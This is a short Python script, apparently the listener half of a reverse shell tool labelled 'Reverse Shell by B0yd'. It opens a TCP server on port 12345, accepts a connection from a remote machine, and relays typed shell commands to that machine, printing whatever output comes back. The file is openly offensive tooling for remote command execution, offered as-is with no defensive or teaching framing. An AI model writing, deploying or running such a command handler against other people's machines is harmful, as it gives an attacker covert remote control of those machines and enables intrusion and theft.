import socket

HOST = socket.gethostbyname(socket.gethostname()) 
PORT = 12345 
sock = None

def init_socket():
    try:
        global sock
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print("[Socket created]")
        sock.bind((HOST, PORT))
        print("[Socket bound successfully]")
        # Listen to only one client
        sock.listen()
        print(f"Server listening on port {PORT}")
        accept_conn()
    except socket.error as err:
        print(f"[ERROR] Unable to initialize socket \nverbose: {err}")

def accept_conn():
    print('Reverse Shell by B0yd\n')
    print('?: help\n')
    print('Reverse connections will appear here')
    conn, addr = sock.accept()
    print(f"Connected to {addr[0]}:{addr[1]}")
    handle_client(conn, addr)

def handle_client(conn, addr):
    while True:
        cmd = input('> ')
        if cmd == '?':
            help()
        elif cmd == 'exit' or cmd == 'quit':
            conn.close()
            break
        else:
            cmd_length = len(cmd)
            conn.send(str(cmd_length).encode('utf-8'))
            conn.send(cmd.encode('utf-8'))
            data = conn.recv(1024)
            print(data.decode('utf-8'))


def help():
    print("""Help Menu 
    \nAll kinds of system shell commands are supported based on the OS connected to
    \nto quit type 'quit' or 'exit'""")


print("Server is starting...")
init_socket()
sock.close()
